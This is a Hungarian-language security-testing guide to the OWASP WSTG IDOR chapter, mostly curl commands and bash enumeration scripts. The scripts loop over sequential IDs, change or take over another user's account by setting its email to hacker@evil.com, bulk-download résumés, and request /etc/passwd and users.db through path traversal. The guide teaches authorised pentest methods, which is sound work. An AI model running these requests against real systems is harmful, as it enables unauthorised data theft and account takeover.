# WSTG-AUTHZ-04: Insecure Direct Object References (IDOR) Tesztelése

## Mi a fejezet lényege?

Az **IDOR (Insecure Direct Object References)** azt jelenti, hogy az application **user input** alapján **directly access** objektumokat **authorization check nélkül**. **Sequential ID-k** (invoice=12345 → invoice=12346), **predictable filenames** (file=user123.pdf → file=user124.pdf), vagy **function references** (menuitem=1 → menuitem=999) mind IDOR exploitation pontok.

---

## 4 IDOR Típus

### 1. **Database Record Access**
### 2. **System Operation**
### 3. **File System Resource**
### 4. **Application Functionality**

---

## 1. Database Record IDOR

### Concept:
Parameter value = database record ID.

---

### Attack:

**Normal request:**
```
https://foo.bar/somepage?invoice=12345
→ Shows invoice #12345 (user's own)
```

**Attack:**
```bash
# Try other IDs
curl "https://foo.bar/somepage?invoice=12346"
curl "https://foo.bar/somepage?invoice=12347"
curl "https://foo.bar/somepage?invoice=12348"

# If any show other users' data → IDOR!
```

---

### Systematic Testing:

```bash
# Get your own invoice IDs
curl -b cookies.txt "https://foo.bar/myinvoices"
# Returns: [12345, 12789, 13001]

# Test sequential IDs
for id in {12340..12350}; do
  echo "Testing invoice $id"
  curl -b cookies.txt "https://foo.bar/somepage?invoice=$id"
done

# Check responses for other users' data
```

---

### Common Parameters:

```
invoice=
order_id=
user_id=
account_id=
document_id=
transaction_id=
message_id=
report_id=
```

---

### Real Example:

```bash
# User A (ID=100) orders
https://shop.com/order?id=5001

# Test User B's orders
for id in {5000..5010}; do
  curl -b userA_cookies.txt "https://shop.com/order?id=$id"
done

# If returns other users' orders → CRITICAL IDOR!
```

---

## 2. System Operation IDOR

### Concept:
Parameter specifies which user to operate on.

---

### Attack:

**Change password request:**
```
https://foo.bar/changepassword?user=alice
```

**Attack:**
```bash
# Login as alice
curl -X POST /login -d "user=alice&pass=Pass123" -c alice.txt

# Try changing bob's password
curl -b alice.txt "https://foo.bar/changepassword?user=bob"

# Submit new password form
curl -X POST /changepassword/submit \
  -b alice.txt \
  -d "user=bob&newpassword=Hacked123"

# If successful → alice changed bob's password!
```

---

### Multi-Step Operation:

**Step 1 - Initiate:**
```
GET /changepassword?user=alice
→ Returns form
```

**Step 2 - Submit:**
```
POST /changepassword/submit
user=alice&newpassword=NewPass123
```

**Attack:** Change `user` parameter in Step 1 or Step 2.

---

### Testing:

```bash
# Create two test accounts
# Account A: alice@test.com
# Account B: bob@test.com

# Login as alice
# Try operations on bob:

# Delete bob's account
curl -b alice.txt -X POST /deleteAccount -d "user=bob"

# Update bob's email
curl -b alice.txt -X POST /updateEmail \
  -d "user=bob&newemail=hacker@evil.com"

# Reset bob's 2FA
curl -b alice.txt -X POST /reset2FA -d "user=bob"
```

---

## 3. File System Resource IDOR

### Concept:
Parameter references file name/path.

---

### Attack:

**Normal request:**
```
https://foo.bar/showImage?img=img00011
→ Shows user's image
```

**Attack:**
```bash
# Try other image IDs
curl "https://foo.bar/showImage?img=img00012" -o test.jpg
curl "https://foo.bar/showImage?img=img00013" -o test.jpg
curl "https://foo.bar/showImage?img=img00014" -o test.jpg

# Check if images belong to other users
```

---

### Document Access:

**Normal:**
```
https://foo.bar/download?file=invoice_123.pdf
```

**Attack:**
```bash
# Sequential testing
for i in {120..130}; do
  curl "https://foo.bar/download?file=invoice_$i.pdf" -o "inv_$i.pdf"
done

# Check downloaded files for other users' data
```

---

### Resume/CV Example:

**Upload resumes to:**
```
https://careers.company.com/apply
→ Uploads to: /resumes/user123_resume.pdf
```

**Attack:**
```bash
# Try other user IDs
curl "https://careers.company.com/resumes/user124_resume.pdf"
curl "https://careers.company.com/resumes/user125_resume.pdf"

# Or sequential:
for id in {1..1000}; do
  curl "https://careers.company.com/resumes/user${id}_resume.pdf" \
    -o "resume_$id.pdf" 2>/dev/null
done

# Collected 1000 resumes!
```

---

### Combined with Path Traversal:

```bash
# IDOR + Path Traversal
curl "https://foo.bar/showImage?img=../../../etc/passwd"
curl "https://foo.bar/download?file=../../database/users.db"
```

---

## 4. Application Functionality IDOR

### Concept:
Parameter controls which function to access.

---

### Attack:

**Normal request:**
```
https://foo.bar/accessPage?menuitem=12
→ Shows menu item 12 (allowed)
```

**User's allowed menu items:** 1, 2, 3

**Attack:**
```bash
# Try other menu items
for item in {1..100}; do
  curl -b user_cookies.txt "https://foo.bar/accessPage?menuitem=$item"
done

# Check for admin functions (menuitem=50, 60, etc.)
```

---

### Feature Flag IDOR:

**Request:**
```
https://app.com/dashboard?feature=basic_reports
```

**Attack:**
```bash
# Try premium features
curl -b cookies.txt "https://app.com/dashboard?feature=advanced_analytics"
curl -b cookies.txt "https://app.com/dashboard?feature=admin_panel"
curl -b cookies.txt "https://app.com/dashboard?feature=export_all_data"
```

---

### Page/Section Access:

```bash
# Enumerate sections
for section in admin users reports settings billing exports logs; do
  curl -b user_cookies.txt "https://app.com/section?name=$section"
done
```

---

## UUID/GUID IDOR Testing

### Concept:
UUIDs harder to guess, but still IDOR if no auth check.

---

### Attack:

**Request:**
```
https://api.com/document/a3f5b2c1-4d8e-9f1a-b3c4-567890abcdef
```

**How to get other UUIDs:**
```
1. Leaked in responses (list endpoints)
2. Sequential patterns (time-based UUIDs)
3. Public listings
4. Error messages
```

---

### Testing:

```bash
# Get UUID from list endpoint
curl -b cookies.txt "https://api.com/documents"
# Returns: [{id: "a3f5...", title: "Public Doc"}, ...]

# Try UUIDs from listing on restricted endpoint
curl -b cookies.txt "https://api.com/document/a3f5b2c1-4d8e-9f1a-b3c4-567890abcdef"

# If accessible → IDOR (even with UUID!)
```

---

## Multi-Parameter IDOR

### Concept:
Object reference split across multiple parameters.

---

### Example:

```
https://app.com/api/message?user_id=123&message_id=456
```

**Attack:**
```bash
# Your user_id=123
# Try other user_id + their message_id

# Get message IDs from public listing
curl "https://app.com/api/messages/public"
# Shows message_id=789 from user_id=999

# Try accessing
curl -b cookies.txt "https://app.com/api/message?user_id=999&message_id=789"

# If successful → multi-param IDOR!
```

---

## Praktikus Testing Workflow

### Step 1: **Create Test Accounts**

```bash
# Account A
curl -X POST /register -d "email=testA@test.com&pass=Pass123"

# Account B  
curl -X POST /register -d "email=testB@test.com&pass=Pass123"
```

---

### Step 2: **Map Objects for Each User**

```bash
# Login as User A
curl -X POST /login -d "email=testA@test.com&pass=Pass123" -c userA.txt

# Create data as User A
curl -b userA.txt -X POST /createOrder -d "item=Laptop"
# Returns: order_id=1001

curl -b userA.txt -X POST /uploadDoc -F "file=@test.pdf"
# Returns: doc_id=5001

# Login as User B - repeat
# User B gets: order_id=1002, doc_id=5002
```

---

### Step 3: **Cross-Account Testing**

```bash
# As User A, try accessing User B's objects

# User B's order
curl -b userA.txt "https://app.com/order?id=1002"

# User B's document
curl -b userA.txt "https://app.com/download?doc_id=5002"

# If successful → IDOR vulnerability!
```

---

### Step 4: **Systematic Enumeration**

```bash
# Sequential ID testing
for id in {1000..1010}; do
  response=$(curl -s -b userA.txt "https://app.com/order?id=$id")
  echo "Order $id: $(echo $response | grep -o 'username')"
done

# Look for other usernames in responses
```

---

## Automated Testing Script

```bash
#!/bin/bash

# IDOR scanner
BASE_URL="https://app.com"
COOKIE="session=abc123"

# Test range
START=1000
END=1050

echo "Testing IDOR on /api/invoice"

for id in $(seq $START $END); do
  response=$(curl -s -b "$COOKIE" "$BASE_URL/api/invoice?id=$id")
  
  # Check if response contains data
  if echo "$response" | grep -q "invoice_total"; then
    echo "[FOUND] Invoice $id accessible"
    
    # Extract username to verify
    username=$(echo "$response" | grep -o '"username":"[^"]*"')
    echo "  → $username"
  fi
done
```

---

## Fontos Toolok

- **Burp Suite Intruder** - Sequential ID testing
- **Autorize extension** - Automated IDOR detection
- **curl** - Manual testing
- **Custom scripts** - Mass enumeration

---

## Fontos Megjegyzések

✅ **2+ test accounts** essential  
✅ **Sequential IDs** = easiest IDOR  
✅ **UUID** ≠ security (still IDOR without auth)  
✅ **Every parameter** potential IDOR point  
❌ **No authorization check** = IDOR!  
⚠️ **Multi-step operations** check all steps!  
⚠️ **File downloads** common IDOR target!  

---

**Összefoglalva:** **IDOR** = direct object access without authorization. **4 típus**: **(1) Database** (invoice=12345→12346), **(2) Operation** (user=alice→bob password change), **(3) File** (img=001→002), **(4) Function** (menuitem=1→99). **Testing**: create 2 accounts → map objects → cross-access test. **UUID nem protection** without auth check! **Sequential testing** (for loop 1000-2000) reveals IDOR. **Multi-parameter** IDOR (user_id=X&doc_id=Y) trükkösebb!
